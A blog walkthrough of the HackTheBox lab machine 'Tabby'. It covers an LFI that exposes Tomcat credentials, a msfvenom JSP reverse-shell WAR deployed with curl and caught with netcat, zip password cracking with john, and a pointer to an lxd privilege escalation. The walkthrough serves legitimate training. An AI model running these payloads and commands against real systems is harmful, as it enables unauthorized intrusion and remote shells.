---
layout: post
title: "HackTheBox - Tabby"
description: "Walkthrough of Tabby box on Hackthebox."
thumb_image: "documentation/tabbythumb.png"
tags: [ hackthebox ]
---

{% include image.html path="documentation/tabby.webp"
path-detail="documentation/tabby.webp"
alt="HTB Tabby" %}

## HTB - Tabby

IP - 10.10.10.194

### Overview

This box was a easy level linux box on HTB created by [egre55](https://www.hackthebox.eu/home/users/profile/1190) , it started with finding an `LFI` on the website running on port `80` and using it to find the `credentials` of the `tomcat` manager portal, but manager portal is not accessible to us so we cannot upload our `war exploit` using it instead we use `curl` to upload and deploy our war exploit and get a `reverse shell` through it. User is simple, basic enumeration will lead to you a `zip file` and then we crack the password of that zip file, which is also the password of user `ash`. Root was pretty slick based on `lxd`, we found user ash is in group lxd and then simply follow an `lxd privesc blog` to get root on the box.

### Enumeration

As always let’s start off with nmap script nmap -sC for default scripts ~~Alright, if it isn’t obvious yet I am a IPPSEC fanboi.~~ Aight, firing up nmap to scan all open ports on the box.

{% highlight bash %}
nmap -sC -sV -oA nmap/results 10.10.10.194
{% endhighlight %} 
And here is our nmap result
{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
└──╼ $cat nmap/result 
# Nmap 7.80 scan initiated Sun Jun 21 14:32:32 2020 as: nmap -sC -sV -oA nmap/result 10.10.10.194
Nmap scan report for 10.10.10.194
Host is up (0.25s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 21 14:33:24 2020 -- 1 IP address (1 host up) scanned in 52.75 seconds
{% endhighlight %}

So we have Apache web server on port 80, lets explore that first.

#### Enumerating the Apache Web Server

The website looks like some hosting platform.

{% include image.html path="documentation/tabbyapache.webp"
path-detail="documentation/tabbyapache.webp"
alt="HTB Tabby" %}

After a bit enumeration, we find `news.php` page which has an `LFI`.

{% include image.html path="documentation/tabbyapachenews.webp"
path-detail="documentation/tabbyapachenews.webp"
alt="HTB Tabby" %}
{% include image.html path="documentation/tabbyapachelfi.webp"
path-detail="documentation/tabbyapachelfi.webp"
alt="HTB Tabby" %}

I tried to find `apache logs` or any other logs that might help me get `RCE` but got nothing usefull at all. So I started enumeration the other `tomcat server`.

#### Enumerating the Tomcat Web Server

Ahh.. Default Tomcat page D: 
{% include image.html path="documentation/tabbytomcat.webp"
path-detail="documentation/tabbytomcat.webp"
alt="HTB Tabby" %}

I tried using `gobuster` to find hidden directories but got nothing at all D:

#### Foothold

After reading forums I got the nudge that we can look for the file that stores the default creds of tomcat user, using the `LFI` vuln we have on the main website running on port 80. 

{% include image.html path="documentation/tabbycreds.webp"
path-detail="documentation/tabbycreds.webp"
alt="HTB Tabby" %}

And we got tomcat credentials `tomcat:$3cureP4s5w0rd123!`

{% include image.html path="documentation/tabbymanager.webp"
path-detail="documentation/tabbymanager.webp"
alt="HTB Tabby" %}

Ah even though our creds are right we don’t have access to the manager console, I looked around for ways to upload our war exploit and found that we can use `curl` to upload and deploy it. _Thanks to `pop_eax` for nudge on the command as those bad characters were messing it up for me._ <br>
Alright first thing first, let’s create a reverse shell exploit using `msfvenom`.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
└──╼ $msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.182 LPORT=9889 -f war > shell.war
Payload size: 1097 bytes
Final size of war file: 1097 bytes
{% endhighlight %} 

Cool, now let’s upload our war exploit using using the `curl` command.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
└──╼ $curl -u tomcat:'$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/pwned&update=true" --upload-file shell.war
OK - Deployed application at context path [/pwned]
{% endhighlight %} 

Yeet, it got successfully deployed, starting the netcat listner using `rlwrap nc -lvnp 9889` and navigating to `http://10.10.10.194:8080/pwned` to get our reverse shell.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
└──╼ $rlwrap nc -lvnp 9889
listening on [any] 9889 ...
connect to [10.10.14.182] from (UNKNOWN) [10.10.10.194] 35390
whoami
tomcat
which python
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm
export TERM=xterm
tomcat@tabby:/var/lib/tomcat9$ 
{% endhighlight %} 

### Getting User

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
└──╼ $rlwrap nc -lvnp 9889
listening on [any] 9889 ...
connect to [10.10.14.182] from (UNKNOWN) [10.10.10.194] 35390
...
tomcat@tabby:/var/www/html/files$ ls
ls
16162020_backup.zip  archive  revoked_certs  statement
tomcat@tabby:/var/www/html/files$
{% endhighlight %} 

After some basic enumeration we got a zip file which was password protected, so I pulled it over to my machine and cracked it using john, `zip2john *.zip > hash and john hash -wordlist=/usr/share/wordlist/rockyou.txt`.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
└──╼ $john hashed --show
16162020_backup.zip:admin@it::16162020_backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:16162020_backup.zip

1 password hash cracked, 0 left
{% endhighlight %} 

Got the password for the zip file `admin@it` and it was also the password of user `ash`.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Tabby]
└──╼ $rlwrap nc -lvnp 9889
listening on [any] 9889 ...
connect to [10.10.14.182] from (UNKNOWN) [10.10.10.194] 35390
...
tomcat@tabby:/$ su
su
password : admit@it
ash@tabby:/$whoami
whoami
ash
{% endhighlight %} 

### Rooting the Box

{% highlight bash %}
sh@tabby:/$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
{% endhighlight %} 

`lxd` seems like something interesting, I googled about it and found a [blog post](https://www.hackingarticles.in/lxd-privilege-escalation/) that covers how you can do a privesc if user is in `lxd group`, I simply followed the blog to get root. _I am not covering the root part as it’s simple and a blog covering it is already present._

{% include image.html path="documentation/tabbyroot.webp"
path-detail="documentation/tabbyroot.webp"
alt="HTB Tabby" %}

###### Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.